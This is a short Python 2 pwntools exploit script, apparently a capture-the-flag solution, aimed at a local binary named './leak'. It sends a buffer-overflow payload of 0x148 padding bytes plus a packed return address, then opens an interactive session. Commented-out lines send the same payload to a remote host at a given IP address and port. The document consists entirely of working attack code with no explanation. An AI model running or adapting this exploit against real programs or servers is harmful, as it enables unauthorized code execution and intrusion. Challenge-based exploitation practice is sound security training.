from pwn import *

r = process("./leak")
r.sendline("A"*0x148 + p64(0xdeadbef0))

#s = remote("88.92.95.14", 5555)
#s.recvuntil("Name:")
#log.info("Sending payload")
#s.sendline("A" * 0x148 + p64(0xdeadbef0))

print r.recvall()
r.interactive()
